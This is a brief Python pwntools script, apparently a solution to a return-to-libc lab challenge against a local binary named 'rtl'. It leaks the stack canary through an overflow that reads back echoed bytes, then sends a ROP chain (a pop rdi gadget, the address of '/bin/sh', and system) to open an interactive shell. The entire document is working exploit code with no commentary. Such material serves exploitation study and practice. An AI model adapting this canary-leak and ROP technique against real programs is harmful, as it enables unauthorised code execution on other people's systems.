from pwn import *

def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))


p = process("./rtl")
e = ELF("./rtl")
r = ROP(e)

system = e.symbols['system']
binsh = sh = next(e.search(b'/bin/sh'))

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]


buf = b'A' * 57
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
canary = u64(b'\x00'+p.recvn(7))
slog("Canary", canary)


payload = b'A' * 56
payload += p64(canary)
payload += b'B' * 8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

p.sendlineafter("Buf: ", payload)

p.interactive()


